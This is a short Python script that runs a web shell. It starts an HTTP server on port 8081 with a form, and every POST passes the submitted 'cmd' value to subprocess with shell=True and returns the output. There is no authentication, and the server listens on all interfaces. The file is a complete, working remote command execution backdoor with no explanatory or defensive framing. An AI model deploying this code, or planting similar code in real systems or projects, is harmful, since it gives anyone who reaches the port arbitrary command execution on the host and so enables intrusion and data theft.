import os
import subprocess
import http.server
import socketserver

PORT = 8081

class WebShellHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        self.wfile.write(b"<html><body>")
        self.wfile.write(b"<form method='POST'>")
        self.wfile.write(b"<input type='text' name='cmd' autofocus>")
        self.wfile.write(b"<input type='submit' value='Execute'>")
        self.wfile.write(b"</form>")
        self.wfile.write(b"</body></html>")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode("utf-8")
        cmd = post_data.split("=")[1]
        cmd = cmd.replace("+", " ")
        
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        self.wfile.write(b"<html><body>")
        self.wfile.write(b"<pre>" + output + b"</pre>")
        self.wfile.write(b"<form method='POST'>")
        self.wfile.write(b"<input type='text' name='cmd' autofocus>")
        self.wfile.write(b"<input type='submit' value='Execute'>")
        self.wfile.write(b"</form>")
        self.wfile.write(b"</body></html>")

with socketserver.TCPServer(("", PORT), WebShellHandler) as httpd:
    print(f"Serving webshell at http://127.0.0.1:{PORT}")
    httpd.serve_forever()
